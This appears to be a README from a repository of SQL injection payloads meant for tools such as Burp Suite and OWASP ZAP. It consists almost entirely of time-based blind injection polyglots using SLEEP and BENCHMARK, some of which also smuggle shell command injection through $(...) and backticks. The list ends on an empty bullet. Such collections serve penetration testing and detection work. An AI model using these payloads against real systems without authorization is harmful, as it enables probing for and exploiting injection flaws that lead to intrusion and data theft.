# SQL-Injection-Payloads
SQL Injection Payloads for Burp Suite, OWASP Zed Attack Proxy,...

## POLYGLOTS:
* avlidienbrunn
  * ```SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/```
* https://labs.detectify.com/2013/05/29/the-ultimate-sql-injection-payload/
  * ```IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),​SLEEP(1)))OR"*/```
  * ```IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/```
* bl4ckh4ck5
  * ```/*$(sleep 5)`sleep 5``*/-sleep(5)#'/*$(sleep 5)`sleep 5` #*/||sleep(5)||'"||sleep(5)||"` ```
  * ```/*$(sleep 5)`sleep 5``*/sleep(5)#'/*$(sleep 5)`sleep 5` #*/||sleep(5)||'"||sleep(5)||"` ```
* geeknik
  * ```if(now()=sysdate(),sleep(9),0)/*'XOR(if(now()=sysdate(),sleep(9),0))OR'"XOR(if(now()=sysdate(),sleep(9),0))OR"*/```
* 
